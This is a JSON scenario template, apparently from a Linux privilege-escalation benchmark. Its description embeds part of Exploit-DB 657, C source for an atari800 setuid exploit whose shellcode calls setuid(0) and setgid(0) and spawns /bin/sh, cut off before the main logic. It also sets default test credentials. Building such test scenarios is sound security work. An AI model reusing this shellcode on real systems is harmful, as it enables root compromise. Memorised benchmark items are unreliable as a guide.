@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_657",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: atari800 - Local Privilege Escalation (OSVDB-12610)\n\nExploit source code (657.c):\n```\n/*\n* Exploit for atari800 by pi3 (pi3ki31ny)\n*\n* pi3@pi3:~$ ./p\n*\n*         ...::: -=[ exploit for Atari800 by pi3 (pi3ki31ny) ]=- :::...\n*\n*         Ussage:\n*         [+] ./p [options]\n*\n*             -? <this help screen>\n*             -v choose a bug:\n*                    1 - first bug    (in all versions Atari800)\n*                    2 - second bug   (in older Atari800 - modiy argv[0])\n*                    3 - third bug    (in config file - OS/A_ROM)\n*                    4 - fourth bug   (in config file - OS/B_ROM)\n*                    5 - fifth bug    (in config file - XL/XE_ROM)\n*                    6 - sixth bug    (in config file - BASIC_ROM)\n*             -o <offset>\n*             -p PATH\n*\n* pi3@pi3:~$\n*\n* Atari800 have suid bit in default instalation.\n* Best regards pi3 (pi3ki31ny).\n*\n* \"Kazdemu trafi sie gowno...!\"\n*\n* Greetz: [greetz on my web] && other my friends (you know who you are)\n*\n*         ...::: -=[ www.pi3.int.pl ]=- :::...\n*/\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <getopt.h>\n#include <assert.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n\n#define PATH \"/usr/local/bin/atari800\"\n#define DIRS 256\n#define CONFIG \".atari800.cfg\"\n\n/*    ...::: -=[ www.pi3.int.pl ]=- :::...    */\n\nchar shellcode[] = \"\\x31\\xdb\\x31\\xc0\\x31\\xd2\\xb2\\x2d\\x6a\\x0a\\x68\\x3a\"\n                  \"\\x2e\\x2e\\x2e\\x68\\x2d\\x20\\x3a\\x3a\\x68\\x6c\\x20\\x5d\"\n                  \"\\x3d\\x68\\x6e\\x74\\x2e\\x70\\x68\\x69\\x33\\x2e\\x69\\x68\"\n                  \"\\x77\\x77\\x2e\\x70\\x68\\x3d\\x5b\\x20\\x77\\x68\\x3a\\x3a\"\n                  \"\\x20\\x2d\\x68\\x2e\\x2e\\x2e\\x3a\\x89\\xe1\\xb0\\x04\\xcd\"\n                  \"\\x80\"\n\n/*    setuid(0)    */\n\n                  \"\\x31\\xdb\\x89\\xd8\\xb0\\x17\\xcd\\x80\"\n\n/*    setgid(0)    */\n\n                  \"\\x31\\xdb\\x89\\xd8\\xb0\\x2e\\xcd\\x80\"\n\n/*    exec /bin/sh    */\n\n                  \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\"\n                  \"\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\xcd\"\n                  \"\\x80\"\n\n/*    exit(0)    */\n\n                  \"\\x31\\xdb\\x89\\xd8\\xb0\\x01\\xcd\\x80\";\n\nlong ret_ad(char *a1, char *a2) {\n\n//   return (0xbffffffa-strlen(a1)-strlen(a2));\n    return 0xbfffee01;\n}\n\nint ussage(char *arg) {\n\n  printf(\"\\n\\t...::: -=[ exploit for Atari800 by pi3 (pi3ki31ny) ]=- :::...\\n\");\n  printf(\"\\n\\tUssage:\\n\\t[+] %s [options]\\n\n           -? <this help screen>\n           -v choose a bug:\n                  1 - first bug    (in all versions Atari800)\n                  2 - second bug   (in older Atari800 - modiy argv[0])\n                  3 - third bug    (in config file - OS/A_ROM)\n                  4 - fourth bug   (in config file - OS/B_ROM)\n                  5 - fifth bug    (in config file - XL/XE_ROM)\n                  6 - sixth bug    (in config file - BASIC_ROM)\n           -o <offset>\n           -p PATH\\n\\n\",arg);\n  exit(-1);\n}\n\nint main(int argc, char *argv[]) {\n\n  long ret,*buf_addr;\n  char envp[8196],*path=PATH;\n  static char *sh[0x02];\n  char buf[DIRS],link[500],conf\n```",
+  "cve": "OSVDB-12610",
+  "exploitdb_id": "657",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_657",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
